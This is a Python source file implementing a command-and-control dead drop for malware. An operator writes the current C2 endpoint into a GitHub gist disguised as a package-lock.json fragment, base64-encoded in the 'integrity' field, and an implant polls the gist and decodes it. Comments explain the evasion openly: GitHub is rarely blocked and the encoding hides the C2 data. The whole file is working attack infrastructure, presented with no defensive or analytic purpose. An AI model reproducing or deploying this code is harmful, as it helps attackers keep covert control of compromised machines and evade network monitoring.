# deaddrop.py — Stable rendezvous point on GitHub Gist
import requests
import json
import base64
from typing import Any, Dict

class DeadDrop:
    """
    The ONLY stable artifact in the entire infrastructure.
    A GitHub gist that the implant polls to get the current C2 endpoint.

    The gist looks like a config file for a legit-looking open source project.
    The actual C2 config is base64-encoded inside a JSON field that looks
    like a build artifact hash.

    GitHub is high-trust, rarely blocked, and gists are served over HTTPS
    with valid TLS. Perfect dead drop.
    """

    GIST_API = "https://api.github.com/gists"

    def __init__(self, gist_token: str, gist_id: str):
        self.token = gist_token
        self.gist_id = gist_id
        self.headers = {
            "Authorization": f"Bearer {self.token}",
            "Accept": "application/vnd.github+json"
        }

    def update(self, config: Dict[str, Any]) -> None:
        """Push new C2 config to the gist, encoded as a 'build hash'."""
        # Encode the config so it doesn't look like C2 data
        encoded = base64.b64encode(json.dumps(config).encode()).decode()

        # The gist file looks like a package-lock.json fragment
        content = json.dumps({
            "name": "cloudsync-sdk",
            "version": "2.4.1",
            "resolved": "https://registry.npmjs.org/cloudsync-sdk/-/cloudsync-sdk-2.4.1.tgz",
            "integrity": encoded,   # <-- this is the actual C2 config, base64'd
            "dev": True
        }, indent=2)

        resp = requests.patch(
            f"{self.GIST_API}/{self.gist_id}",
            headers=self.headers,
            json={
                "files": {
                    "package-lock.json": {"content": content}
                }
            }
        )
        resp.raise_for_status()

    def read(self) -> Dict[str, Any]:
        """Read current C2 config from the gist (implant-side)."""
        resp = requests.get(
            f"{self.GIST_API}/{self.gist_id}",
            headers={"Accept": "application/vnd.github+json"}
        )
        resp.raise_for_status()
        gist = resp.json()

        # Find the package-lock.json file
        for filename, filedata in gist["files"].items():
            if "package-lock" in filename or "integrity" in (filedata.get("content") or ""):
                content = json.loads(filedata["content"])
                encoded = content.get("integrity", "")
                if encoded:
                    return json.loads(base64.b64decode(encoded).decode())

        raise ValueError("No valid config found in dead drop gist")
